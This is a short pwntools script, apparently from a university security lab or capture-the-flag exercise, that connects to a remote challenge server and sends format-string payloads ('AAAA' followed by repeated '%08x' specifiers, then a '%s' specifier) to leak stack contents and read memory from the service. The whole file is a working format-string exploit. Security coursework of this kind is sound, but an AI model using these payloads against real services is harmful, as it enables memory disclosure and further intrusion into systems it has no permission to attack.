from pwn import *

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 25191

### run a remote process
s = remote(SERVER, PORT, timeout=9999)

### run a local process
#s = process('./program/01_local_read', shell=True)
### interact with it

# s.recvall()
# s.recvuntil(b'Message : ')
# s.recvline()

# s.send(129 * b'a' + b'\n')
s.sendline(b'AAAA' + 8* b'.%08x' + b'\n')

response = s.recv().decode()
print(response) 

s = remote(SERVER, PORT, timeout=9999)
#s = process('./program/01_local_read', shell=True)

s.sendline(b'AAAA' + 6* b'.%08x' + b'.%s\n')

response = s.recv().decode()
print(response) 